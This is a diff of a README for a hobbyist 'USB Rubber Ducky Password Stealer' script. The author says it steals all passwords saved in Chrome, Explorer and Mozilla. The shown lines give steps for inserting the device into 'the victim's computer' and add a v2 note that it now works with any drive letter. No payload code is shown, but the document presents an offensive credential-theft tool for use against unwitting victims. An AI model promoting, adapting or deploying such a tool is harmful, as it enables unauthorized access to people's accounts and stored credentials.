@@ -1,5 +1,5 @@
-# USB Rubber Ducky Password Stealer
-
+# USB Rubber Ducky Password Stealer v2
+#
 Hi guys, this is a simple script, that i've made, to steal all passwords saved on computer(Chrome, Explorer, Mozilla ecc...), using the USB Rubber Ducky !
 
 # INSTRUCTIONS
@@ -10,7 +10,7 @@ Hi guys, this is a simple script, that i've made, to steal all passwords saved o
 #
 3)Now remove the USB and put it again into the victim's computer to start the Script (Wait until the script is finished)
 #
-4)(OPTIONAL) Correct the DELAYS, or the USB location for the .exe (Default is D:\ but if you've other Disks/USBs, he can change) if you want, from the Open Source File
+4)(OPTIONAL) Correct the DELAYS or other things if you want, from the Open Source File
 #
 # V2 UPDATE
 -Now the USB can take every letter (ex: D:\, F:G\ or G:\)
